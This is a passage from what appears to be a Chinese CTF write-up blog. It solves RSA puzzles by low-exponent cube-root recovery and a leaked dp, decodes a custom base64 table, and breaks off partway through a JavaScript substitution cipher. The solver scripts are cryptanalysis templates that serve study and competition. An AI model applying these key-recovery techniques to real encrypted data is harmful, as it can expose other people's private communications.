11212699652154912414419576042130573737460880175860430868241856564678915039929479534373946033032215673944727767507831028500814261134142245577246925294110977629353584372842303558820509861245550773062016272543030477733653059813274587939179134498599049035104941393508776333632172797303569396612594631646093552388772109708942113683783815011735472088985078464550997064595366458370527490791625688389950370254858619018250060982532954113416688720602160768503752410505420577683484807166966007396618297253478916176712265476128018816694458551219452105277131141962052020824990732525958682439071443399050470856132519918853636638476540689226313542250551212688215822543717035669764276377536087788514506366740244284790716170847347643593400673746020474777085815046098314460862593936684624708574116108322520985637474375038848494466480630236867228454838428542365166285156741433845949358227546683144341695680712263215773807461091898003011630162481</span></span><br><span class="line"><span class="comment"># p3 = 891438237083490546089708018947678893226384856270496377765399277417697191150845296075484241536063149330788867177806265725641352439792185047059884077696267280233195764685547392586251429555216372682368991273055524268769223153988946085858123028200360359212117360701384933036871231911448311911374115683475228820531478240539549424647154342506853356292956506486091063660095505979187297020928573605860329881982122478494944846700224611808246427660214535971723459345029873385956677292979041143593821672034573140001092625650099257402018634684516092489263998517027205660003413512870074652126328536906790020794659204007921147300771594986038917179253827432120018857213350120695302091483756021206199805521083496979628811676116525321724267588515105188480380865374667274442027086789352802613365511142499668793725505110436809024171752137883546327359935102833441492430652019931999144063825010678766130335038975376834579129516127516820037383067</span></span><br><span class="line"><span class="comment"># q3 = 44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761440671033435053531971051698504592848580356684103015611323747688216493729331061402058160819388999663041629882482138465124920580049057123360829897432472221079140360215664537272316836767039948368780837985855835419681893347839311156887660438769948501100287062738217966360434291369179859862550767272985972263442512061098317471708987686120577904202391381040801620069987103931326500146536990700234262413595295698193570184681785854277656410199477649697026112650581343325348837547631237627207304757407395388155701341044939408589591213693329516396531103489233367665983149963665364824119870832353269655933102900004362236232825539480774</span></span><br><span class="line"><span class="comment"># r3 = 22285955927087263652242700473691972330659621406762409444134981935442429778771132401887106038401578733269721679445156643141033810994804626176497101942406682005829894117138684814656285738880409317059224781826388106719230578849723652146453075705009008980302934017534623325921780797786207797784352892086880720749202442492937918619992591614713131681306874944356693778359565004415437554407990089293135634916859631279984463829118336826115430997439527110961309956466956650522900331263720500751112297418506140413317489683875995326726992533904683800042127871963320754241310699432792081707870167598822650064976439270556418985242630368723264289700246406905189810458354474959276748887369363592834205660349184660073395182450526542246354364903399132116153732074081050985584216815493617906868615192465631416955706457835185743023758573279838341229835613609332206338401219168119635681832981552328638132500079074010106995297184587143613134093145</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析</p>
<p>p = getPrime(1024)</p>
<p> r = p * 5 + i    判断r是否为素数，如果是素数 i清零  否则j++ 直到r为素数</p>
<p>q = p * 10 + i  q也同理r</p>
<p>n = p * q * r e = 65537 c = pow(bytes_to_long(flag.encode()), e, n)</p>
<p>求m </p>
<p>p3 q3 r3  均为  X ^3 mod n   优先考虑低加密指数攻击</p>
<p>C 三 m^e mod n C = k*n + m^e  , k∈Z </p>
<p>p3 = pow(p, 3, n) q3 = pow(q, 3, n) r3 = pow(r, 3, n)</p>
<p>c = pow(m,e,n)</p>
<p>然后低加密指数求出对应的 p q r </p>
<p>n = q * p * r </p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k = k+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>用这个脚本 带入 q3 p3 r3 可以求出 p q    ，r没求出来。</p>
<p>但是知道 p q n 也就可以求出r来</p>
<p>r 可根据原题中p去求出来</p>
<p>求出后就正常求phi d m 即可得到flag</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761441087845248621463389786351743200696279604003824362262237505386409700329605140703782099240992158439201646344692107831931849079888757310523663310273856448713786678014221779214444879454790399990056124051739535141631564534546955444505648933134838799753362350266884682987713823886338789502396879543498267617432600351655901149380496067582237899323865338094444822339890783781705936546257971766978222763417870606459677496796373799679580683317833001077683871698246143179166277232084089913202832193540581401453311842960318036078745448783370048914350299341586452159634173821890439194014264891549345881324015485910286021846721593668473</span></span><br><span class="line">c = <span class="number">11212699652154912414419576042130573737460880175860430868241856564678915039929479534373946033032215673944727767507831028500814261134142245577246925294110977629353584372842303558820509861245550773062016272543030477733653059813274587939179134498599049035104941393508776333632172797303569396612594631646093552388772109708942113683783815011735472088985078464550997064595366458370527490791625688389950370254858619018250060982532954113416688720602160768503752410505420577683484807166966007396618297253478916176712265476128018816694458551219452105277131141962052020824990732525958682439071443399050470856132519918853636638476540689226313542250551212688215822543717035669764276377536087788514506366740244284790716170847347643593400673746020474777085815046098314460862593936684624708574116108322520985637474375038848494466480630236867228454838428542365166285156741433845949358227546683144341695680712263215773807461091898003011630162481</span></span><br><span class="line">p3 = <span class="number">891438237083490546089708018947678893226384856270496377765399277417697191150845296075484241536063149330788867177806265725641352439792185047059884077696267280233195764685547392586251429555216372682368991273055524268769223153988946085858123028200360359212117360701384933036871231911448311911374115683475228820531478240539549424647154342506853356292956506486091063660095505979187297020928573605860329881982122478494944846700224611808246427660214535971723459345029873385956677292979041143593821672034573140001092625650099257402018634684516092489263998517027205660003413512870074652126328536906790020794659204007921147300771594986038917179253827432120018857213350120695302091483756021206199805521083496979628811676116525321724267588515105188480380865374667274442027086789352802613365511142499668793725505110436809024171752137883546327359935102833441492430652019931999144063825010678766130335038975376834579129516127516820037383067</span></span><br><span class="line">q3 = <span class="number">44571911854174527304485400947383944661319242813524818888269963870884859557542264803774212076803157466539443358890313286282067621989609252352994203884813364011659788234277369629312571477760818634118449563652776213438461157699447304292906151410018017960605868035069246651843561595572415595568705784173761440671033435053531971051698504592848580356684103015611323747688216493729331061402058160819388999663041629882482138465124920580049057123360829897432472221079140360215664537272316836767039948368780837985855835419681893347839311156887660438769948501100287062738217966360434291369179859862550767272985972263442512061098317471708987686120577904202391381040801620069987103931326500146536990700234262413595295698193570184681785854277656410199477649697026112650581343325348837547631237627207304757407395388155701341044939408589591213693329516396531103489233367665983149963665364824119870832353269655933102900004362236232825539480774</span></span><br><span class="line">r3 = <span class="number">22285955927087263652242700473691972330659621406762409444134981935442429778771132401887106038401578733269721679445156643141033810994804626176497101942406682005829894117138684814656285738880409317059224781826388106719230578849723652146453075705009008980302934017534623325921780797786207797784352892086880720749202442492937918619992591614713131681306874944356693778359565004415437554407990089293135634916859631279984463829118336826115430997439527110961309956466956650522900331263720500751112297418506140413317489683875995326726992533904683800042127871963320754241310699432792081707870167598822650064976439270556418985242630368723264289700246406905189810458354474959276748887369363592834205660349184660073395182450526542246354364903399132116153732074081050985584216815493617906868615192465631416955706457835185743023758573279838341229835613609332206338401219168119635681832981552328638132500079074010106995297184587143613134093145</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 低加密指数攻击</span></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     res = gmpy2.iroot(p3+k*n,e)</span></span><br><span class="line"><span class="comment">#     if(res[1] == True):</span></span><br><span class="line"><span class="comment">#         print(&#x27;p=&#x27;,res[0])</span></span><br><span class="line"><span class="comment">#         # print(libnum.n2s(int(res[0])))</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     k = k+1</span></span><br><span class="line">p= <span class="number">96241803526087516516438618680574139229212699224895199026126947479609515703069904259770933066463243844738712136916991719874179296797623802919752542053959297743706931240798992583332970879091497936378700193716012227086531507335444090574605921869576355704757589370608232721639204280020820678250787751406162350723</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     res = gmpy2.iroot(q3+k*n,e)</span></span><br><span class="line"><span class="comment">#     if(res[1] == True):</span></span><br><span class="line"><span class="comment">#         print(&#x27;q=&#x27;,res[0])</span></span><br><span class="line"><span class="comment">#         # print(libnum.n2s(int(res[0])))</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     k = k+1</span></span><br><span class="line">q = <span class="number">962418035260875165164386186805741392292126992248951990261269474796095157030699042597709330664632438447387121369169917198741792967976238029197525420539592977437069312407989925833329708790914979363787001937160122270865315073354440905746059218695763557047575893706082327216392042800208206782507877514061623507521</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     res = gmpy2.iroot(r3+k*n,e)</span></span><br><span class="line"><span class="comment">#     if(res[1] == True):</span></span><br><span class="line"><span class="comment">#         print(&#x27;r=&#x27;,res[0])</span></span><br><span class="line"><span class="comment">#         # print(libnum.n2s(int(res[0])))</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     k = k+1</span></span><br><span class="line"><span class="comment"># r求不出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按原题给出的p去求出r</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = p * <span class="number">5</span> + i</span><br><span class="line">    <span class="keyword">if</span> isPrime(r):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e2,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;cc10786a-cc59-a07d-5c9f-df1c55b18cd4&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="LitCTF-2023-P-Leak"><a href="#LitCTF-2023-P-Leak" class="headerlink" title="[LitCTF 2023]P_Leak"></a>[LitCTF 2023]P_Leak</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">m=bytes_to_long(<span class="string">b&#x27;xxxx&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">dp=d%(p-<span class="number">1</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;dp=&quot;</span>,dp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="comment">#dp= 5892502924236878675675338970704766304539618343869489297045857272605067962848952532606770917225218534430490745895652561015493032055636004130931491316020329</span></span><br><span class="line"><span class="comment">#n= 50612159190225619689404794427464916374543237300894011803225784470008992781409447214236779975896311093686413491163221778479739252804271270231391599602217675895446538524670610623369953168412236472302812808639218392319634397138871387898452935081756580084070333246950840091192420542761507705395568904875746222477</span></span><br><span class="line"><span class="comment">#c= 39257649468514605476432946851710016346016992413796229928386230062780829495844059368939749930876895443279723032641876662714088329296631207594999580050131450251288839714711436117326769029649419789323982613380617840218087161435260837263996287628129307328857086987521821533565738409794866606381789730458247531619</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析</p>
<p>已知dp,n,c,e， dp泄露类</p>
<blockquote>
<p>已知 e n c dp 倒推：求m -&gt; 求d -&gt; 求phi -&gt; p q  d = gmpy2.invert(e,phi_n) phi_n = (p-1)(q-1)</p>
<p>由 dp*e 三 e*d mod (p-1) -&gt; e*d = k(p-1)+dp*e， k∈Z  由 e*d 三 1 mod (p-1)(q-1) -&gt; e*d = Ω(p-1)(q-1)+1 ，Ω∈Z 根据两个e*\d 的等式 -》 k(p-1)+dp*e =  Ω(p-1)(q-1)+1 ， k∈Z，Ω∈Z 进而得到  dp * e = (p-1)* (Ω(q-1)-k ) + 1  也就说 dp*e = β(p-1) + 1    ，β∈Z ∵ dp &lt; (p-1) ∴ e&gt;β  即  1&lt;β&lt;e 所以存在一个β  满足  dp*e = β(p-1) + 1  所以遍历β 找到后可求出 p-1 进而求出 p q</p>
</blockquote>
<p>可以直接套模板</p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp= <span class="number">5892502924236878675675338970704766304539618343869489297045857272605067962848952532606770917225218534430490745895652561015493032055636004130931491316020329</span></span><br><span class="line">n= <span class="number">50612159190225619689404794427464916374543237300894011803225784470008992781409447214236779975896311093686413491163221778479739252804271270231391599602217675895446538524670610623369953168412236472302812808639218392319634397138871387898452935081756580084070333246950840091192420542761507705395568904875746222477</span></span><br><span class="line">c= <span class="number">39257649468514605476432946851710016346016992413796229928386230062780829495844059368939749930876895443279723032641876662714088329296631207594999580050131450251288839714711436117326769029649419789323982613380617840218087161435260837263996287628129307328857086987521821533565738409794866606381789730458247531619</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):  <span class="comment"># 在范围(1,e)之间进行遍历</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># 存在p，使得n能被p整除</span></span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)  <span class="comment"># 欧拉定理</span></span><br><span class="line">            d = gmpy2.invert(e, phi)  <span class="comment"># 求模逆</span></span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># 快速求幂取模运算</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;Prim3_1s_Le@k!!!!!&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CISCN-2023-初赛-Sign-in-passwd"><a href="#CISCN-2023-初赛-Sign-in-passwd" class="headerlink" title="[CISCN 2023 初赛]Sign_in_passwd"></a>[CISCN 2023 初赛]Sign_in_passwd</h3><p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D</span><br><span class="line">GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5</span><br></pre></td></tr></table></figure>

<p>第二行带%3D 先进行url解码 解码后65位  推测是base64置换表 直接上 CyberChef 对第一行解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5</span><br></pre></td></tr></table></figure>

<p><img src="/posts/555436f5/2.png" alt="截图"></p>
<p>得到flag  flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4}</p>
<h3 id="GDOUCTF-2023-Absolute-Baby-Encrytpion"><a href="#GDOUCTF-2023-Absolute-Baby-Encrytpion" class="headerlink" title="[GDOUCTF 2023]Absolute_Baby_Encrytpion"></a>[GDOUCTF 2023]Absolute_Baby_Encrytpion</h3><p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice用脚本向Bob发送了以下消息。 这是用JS写的。 Bob对JS一无所知。 你能帮忙看看留言吗？</span><br><span class="line"></span><br><span class="line">+&#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>js脚本</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> messagetoEncrypt = <span class="title function_">prompt</span>(<span class="string">&quot;Enter a string: &quot;</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line"><span class="keyword">let</span> charArray = messagetoEncrypt.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> encryptedString = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> hasInvalidCharacter = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; charArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (charArray[i]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;^&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;j&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;@&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">         